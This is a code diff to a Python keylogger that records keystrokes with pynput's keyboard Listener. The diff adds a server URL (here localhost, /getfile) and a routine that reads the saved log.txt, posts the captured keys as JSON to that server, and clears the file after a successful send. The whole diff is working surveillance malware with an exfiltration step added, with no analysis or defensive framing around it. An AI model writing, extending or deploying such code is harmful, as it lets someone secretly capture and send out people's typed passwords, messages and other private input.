@@ -1,3 +1,4 @@
+import requests
 from typing import List  # Import List for type hinting
 
 # Import Key and Listener to monitor keyboard events
@@ -7,7 +8,7 @@ from pynput.keyboard import Key, Listener
 # Global variables to store key logs
 char_count = 0  # Keeps track of the number of characters logged in a session
 saved_keys = []  # Stores the sequence of pressed keys before writing to a file
-
+server_url = "http://127.0.0.1:5000/getfile"
 
 def on_key_press(key: str):
    """
@@ -63,6 +64,17 @@ def write_to_file(keys: List[str]):
                file.write(key)  # Write the key to the log file
 
        file.write("\n")  # Add a newline after each set of recorded keys
+    
+       try:
+           with open("log.txt", "r") as file:
+               data =file.read()
+           if data.strip():
+             response = requests.post(server_url, json={"logs": data})
+             if response.status_code == 200:
+                print("Logs sent successfully!")
+                open("log.txt", "w").close()
+       except Exception as e:
+              print("Error: ",str(e))
 
 # Start the keylogger using the Listener
 with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
